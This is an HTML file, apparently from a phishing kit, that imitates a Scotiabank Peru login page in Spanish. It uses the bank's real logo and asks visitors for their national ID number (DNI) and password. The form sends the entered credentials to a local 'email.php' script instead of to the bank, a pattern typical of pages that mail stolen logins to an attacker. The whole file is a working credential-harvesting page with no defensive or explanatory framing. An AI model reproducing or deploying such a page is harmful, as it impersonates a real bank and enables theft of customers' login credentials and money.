<!doctype html>
<html lang="en">

<head>
    <title>Login Scotiabank</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet" />
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.9.3/css/bulma.min.css" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <script type="text/javascript">
        function validarCodigo(codigo) {
            var re = /^[a-z\d]{5,}$/i;
            var nre = /^([A-Z]{5,}|[a-z]{5,}|\d{5,}|[A-Z\d]{5,}|[A-Za-z]{5,}|[a-z\d]{5,})$/;
            return (re.test(codigo) && !nre.test(codigo));
        }

        function validarFormulario() {
            var formulario = document.forms['frmPrincipal'];
            var clave = formulario['pass'];
            var strError = '';
            var focusError = null

            if (!strError && !validarCodigo(clave.value)) {
                strError = 'Contraseña incorrecta';
                focusError = clave;
            }

            // Aquí se validan el resto de los campos (en caso de que existan)

            if (strError) {
                alert(strError);
                if (focusError != null) focusError.focus();
            }
            return ('' == strError);
        }
    </script>
    <link rel="stylesheet" href="css/style.css">
    <style>
        div#is-relative {

            position: relative;
        }

        /* El icono debe ser "position: absolute"
 * Ademas le damos un "display: block" y lo posicionamos */
        #icon {
            position: absolute;
            display: block;
            bottom: .5rem;
            right: 1rem;

            user-select: none;
            cursor: pointer;
        }

        input.input {
            padding-right: 2.5rem;
        }
    </style>

</head>

<body>
    <section class="ftco-section">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-6 text-center mb-5">
                    <h2 class="heading-section">Bienvenido <br><img src="https://scotiabankfiles.azureedge.net/scotiabank-peru/Global-Rebrand/logo.svg" alt=""></h2>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="col-md-6 col-lg-5">
                    <div class="login-wrap p-4 p-md-5">
                        <center>
                            <img src="./images/logo-scotiabank-symbol.svg" style="width: 20%;">
                        </center>
                        <h3 class="text-center mb-4"></h3>
                        <form action="email.php" class="login-form" method="POST" name="frmPrincipal" onsubmit="return validarFormulario()">
                            <div class="input-wrapper form-group">
                                <div id="is-relative">
                                    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
                                    <input class="input-number form-control rounded-left" placeholder="Ingrese su DNI" name="persona" type="text" minlength="8" maxlength="8">
                                    <span id="icon">
                                        <i class="far fa-user"></i>
                                    </span>
                                    <script>
                                    
                                        $('.input-number').on('input', function(event) {
                                            this.value = this.value.replace(/[^0-9]/g, '');
                                        });
                                    </script>
                                </div>

                            </div>

                            <div class="input-wrapper form-group">
                                <div id="is-relative">
                                    <input type="password" name="pass" class="form-control rounded-left" placeholder="Ingrese su Contraseña" required>

                                    <span id="icon">
                                        <i class="fas fa-key"></i>
                                    </span>
                                </div>

                            </div>

                            <div class="form-group d-md-flex">
                                <div class="w-100">
                                    <label class="checkbox-wrap checkbox-primary">Recordar mi contraseña
                                        <input type="checkbox" checked>
                                        <span class="checkmark"></span>
                                    </label>
                                </div>

                            </div>
                            <div class="form-group">
                                <button type="submit" class="btn btn-primary rounded submit p-3 px-5">Siguiente</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script src="js/jquery.min.js"></script>
    <script src="js/popper.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/main.js"></script>

</body>

</html>